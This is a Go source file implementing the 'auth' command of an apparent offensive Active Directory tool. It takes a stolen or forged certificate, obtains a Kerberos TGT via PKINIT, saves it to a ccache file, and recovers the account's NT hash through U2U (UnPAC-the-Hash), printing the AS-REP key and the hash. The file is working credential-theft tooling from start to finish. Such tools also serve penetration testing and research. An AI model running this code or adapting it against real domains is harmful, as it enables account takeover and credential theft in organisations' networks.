package commands

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/ineffectivecoder/gopkinit/pkg/ccache"
	"github.com/ineffectivecoder/gopkinit/pkg/pkinit"
	"github.com/ineffectivecoder/gopkinit/pkg/u2u"
	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/spf13/cobra"
)

// AuthFlags holds all flags for the auth command.
type AuthFlags struct {
	// Certificate
	PFXFile   string
	PFXPass   string
	PFXBase64 string

	// Target
	Username string
	Domain   string
	DCIP     string

	// Output
	Output  string
	NoHash  bool
	Debug   bool
	Verbose bool
}

var authFlags AuthFlags

// NewAuthCommand creates the auth subcommand.
func NewAuthCommand() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "auth",
		Short: "Authenticate using a certificate via PKINIT",
		Long: `Authenticate to Active Directory using a certificate via Kerberos PKINIT.

Obtains a TGT and optionally recovers the NT hash via U2U (UnPAC-the-Hash).
This is the equivalent of running gettgtpkinit + getnthash in one step.`,
		RunE: runAuth,
	}

	// Certificate
	cmd.Flags().StringVar(&authFlags.PFXFile, "pfx", "", "PFX/PKCS12 certificate file")
	cmd.Flags().StringVar(&authFlags.PFXPass, "pfx-pass", "", "PFX file password (default: empty)")
	cmd.Flags().StringVar(&authFlags.PFXBase64, "pfx-base64", "", "PFX as base64 string")

	// Target
	cmd.Flags().StringVarP(&authFlags.Username, "username", "u", "", "Username (user@domain or DOMAIN\\user)")
	cmd.Flags().StringVarP(&authFlags.Domain, "domain", "d", "", "Target domain")
	cmd.Flags().StringVar(&authFlags.DCIP, "dc-ip", "", "Domain Controller IP")

	// Output
	cmd.Flags().StringVarP(&authFlags.Output, "output", "o", "", "Output ccache filename (default: <username>.ccache)")
	cmd.Flags().BoolVar(&authFlags.NoHash, "no-hash", false, "Skip NT hash recovery (U2U)")

	// Verbosity
	cmd.Flags().BoolVarP(&authFlags.Verbose, "verbose", "v", false, "Verbose output")
	cmd.Flags().BoolVar(&authFlags.Debug, "debug", false, "Debug output")

	return cmd
}

func runAuth(cmd *cobra.Command, args []string) error {
	// Validate
	if authFlags.PFXFile == "" && authFlags.PFXBase64 == "" {
		return fmt.Errorf("certificate is required (--pfx or --pfx-base64)")
	}
	if authFlags.Username == "" {
		return fmt.Errorf("username is required (-u/--username)")
	}
	if authFlags.DCIP == "" {
		return fmt.Errorf("DC IP is required (--dc-ip)")
	}

	// Extract domain from username
	username := authFlags.Username
	domain := authFlags.Domain
	if domain == "" {
		if strings.Contains(username, "@") {
			parts := strings.SplitN(username, "@", 2)
			domain = parts[1]
			username = parts[0]
		} else if strings.Contains(username, "\\") {
			parts := strings.SplitN(username, "\\", 2)
			domain = parts[0]
			username = parts[1]
		} else {
			return fmt.Errorf("domain is required (-d/--domain) or use user@domain format")
		}
	}
	domain = strings.ToUpper(domain)

	// Load PFX
	var client *pkinit.PKINITClient
	var err error

	if authFlags.PFXBase64 != "" {
		pfxData, err := base64.StdEncoding.DecodeString(authFlags.PFXBase64)
		if err != nil {
			return fmt.Errorf("failed to decode base64 PFX: %w", err)
		}
		client, err = pkinit.NewFromPFXData(pfxData, authFlags.PFXPass)
		if err != nil {
			return fmt.Errorf("failed to load PFX data: %w", err)
		}
	} else {
		client, err = pkinit.NewFromPFX(authFlags.PFXFile, authFlags.PFXPass)
		if err != nil {
			return fmt.Errorf("failed to load PFX: %w", err)
		}
	}

	fmt.Printf("[*] Using certificate from: %s\n", client.GetIssuer())
	fmt.Printf("[*] Requesting TGT for %s@%s\n", username, domain)

	// Request TGT via PKINIT
	result, err := client.GetTGT(domain, username, authFlags.DCIP, "")
	if err != nil {
		return fmt.Errorf("PKINIT failed: %w", err)
	}

	fmt.Printf("[+] Got TGT for %s@%s\n", username, domain)
	fmt.Printf("[*] AS-REP encryption key: %s\n", result.ASRepKey)

	// Save ccache
	ccachePath := authFlags.Output
	if ccachePath == "" {
		ccachePath = fmt.Sprintf("%s.ccache", username)
	}

	// Convert flags for ccache writing
	goforkFlags := asn1.BitString{
		Bytes:     result.EncPart.Flags.Bytes,
		BitLength: result.EncPart.Flags.BitLength,
	}

	encKDCRepPart := messages.EncKDCRepPart{
		Key:           result.SessionKey,
		LastReqs:      []messages.LastReq{},
		Nonce:         0,
		KeyExpiration: result.EncPart.KeyExpiration,
		Flags:         goforkFlags,
		AuthTime:      result.EncPart.AuthTime,
		StartTime:     result.EncPart.StartTime,
		EndTime:       result.EncPart.EndTime,
		RenewTill:     result.EncPart.RenewTill,
		SRealm:        result.EncPart.SRealm,
		SName:         result.EncPart.SName,
		CAddr:         result.EncPart.CAddr,
	}

	err = ccache.WriteCCache(ccachePath, result.Ticket, encKDCRepPart, result.SessionKey, result.Realm, result.CName)
	if err != nil {
		return fmt.Errorf("failed to write ccache: %w", err)
	}
	fmt.Printf("[+] Saved TGT to %s\n", ccachePath)

	// Recover NT hash via U2U (unless --no-hash)
	if !authFlags.NoHash {
		fmt.Printf("[*] Recovering NT hash via U2U...\n")

		asrepKeyBytes, err := hex.DecodeString(result.ASRepKey)
		if err != nil {
			return fmt.Errorf("failed to decode AS-REP key: %w", err)
		}

		u2uClient, err := u2u.NewU2UClient(ccachePath, authFlags.DCIP, asrepKeyBytes)
		if err != nil {
			return fmt.Errorf("failed to initialize U2U client: %w", err)
		}

		ntHash, err := u2uClient.GetNTHash()
		if err != nil {
			fmt.Printf("[!] U2U hash recovery failed: %v\n", err)
			fmt.Printf("[*] You can try manually: getnthash -ccache %s -key %s -dc-ip %s\n",
				ccachePath, result.ASRepKey, authFlags.DCIP)
		} else {
			fmt.Printf("[+] NT Hash: %x\n", ntHash)
		}
	}

	return nil
}
